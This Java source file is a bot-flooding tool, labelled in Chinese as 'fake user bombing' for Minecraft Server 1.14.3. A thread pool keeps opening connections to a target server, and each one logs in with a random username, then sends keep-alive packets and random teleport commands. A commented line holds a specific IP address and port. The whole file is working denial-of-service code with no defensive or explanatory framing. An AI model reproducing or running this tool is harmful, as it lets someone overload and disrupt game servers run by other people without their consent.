import command.TpCommand;
import model.FuckTarget;
import org.apache.commons.lang3.RandomStringUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import static util.HexUtil.hexStrToBinaryStr;
import static util.HexUtil.str2HexStr;

/**
 * 假用户轰炸 for Minecraft Server 1.14.3
 * @author crt106 on 2019/8/10.
 */
class FakeUserFuck {

    private static final String HEAD_HEX_CRT = "1400ea030d7777772e6372743130362e636e63dd02";
    private static final String HEAD_HEX_YYH = "1300ea030c6d632e6372743130362e636e63dd02";
    /**
     * 用于建立十六进制字符的输出的小写字符数组
     */
    private static final char[] DIGITS_LOWER = {'0', '1', '2', '3', '4', '5',
            '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    /**
     * 用于建立十六进制字符的输出的大写字符数组
     */
    private static final char[] DIGITS_UPPER = {'0', '1', '2', '3', '4', '5',
            '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};

    private static BlockingQueue blockingQueue = new ArrayBlockingQueue(100);
    private static ThreadPoolExecutor t = new ThreadPoolExecutor(100, 100, 1500, TimeUnit.MILLISECONDS, blockingQueue);

    public static void main(String[] args) {

        Runnable mainFuck = () -> {
            try {
                FuckTarget fuckTarget = FuckTarget.CRT;
//                Socket socket = new Socket("120.79.169.48", 25565);
                Socket socket = new Socket(fuckTarget.getIp(), fuckTarget.getPort());
                OutputStream os = socket.getOutputStream();
                InputStream in = socket.getInputStream();
                if (os != null) {
//                    String crt106HEX = "080006637274313036";
//                    String rHEX1 = "0b000967646b61736a677067";
                    String rHex = getRandomUserHex();
                    sendHex(os, "");
                    sendHex(os, fuckTarget.getHexhead() + rHex);
                    ReadOne(in);
                    startWrite(os);
                }
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
        };
        initTask(mainFuck);

        while (true) {
            if (t.getActiveCount() < 20) {
                t.execute(mainFuck);
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    private static void initTask(Runnable r) {

        for (int i = 0; i < 30; i++) {
            t.execute(r);
            try {
                Thread.sleep(400);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 获取长度为6的用户名
     *
     * @return
     */
    private static String getRandomUserHex() {
        String rname = RandomStringUtils.randomAlphanumeric(6);
        String rHex = str2HexStr(rname);
        return "080006" + rHex;
    }

    private static byte[] ReadOne(InputStream in) {
        try {
            byte[] b = new byte[1024];
            in.read(b);
            return b;
        } catch (IOException e) {
            e.printStackTrace();
            return new byte[1024];
        }
    }

    private static void startRead(InputStream in) {
        Runnable r = () -> {
            byte[] b = new byte[1024];
            while (true) {
                try {
                    in.read(b);
                    String bstr = new String(b);
                    System.out.println("Read:" + bstr);
                    b = new byte[1024];
                    Thread.sleep(500);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        Thread t = new Thread(r);
        t.start();
    }

    private static void startWrite(OutputStream os) {
        Runnable r = () -> {
            int tpcount = 0;
            while (true) {
                try {
                    sendHex(os, "");
                    tpcount++;
                    System.out.println("write one blank");
                    //执行tp动作
                    if (tpcount == 20) {
                        TpCommand tp = TpCommand.Companion.randomTp();
                        sendHex(os, tp.toHexString());
                        tpcount = 0;
                        System.out.println("write tp command");
                    }
                    Thread.sleep(100);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        t.execute(r);
    }

    private static void sendHex(OutputStream os, String hexStr) {
        try {
            os.write(hexStrToBinaryStr(hexStr));
            os.flush();
            System.out.println("Write:" + hexStr);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}
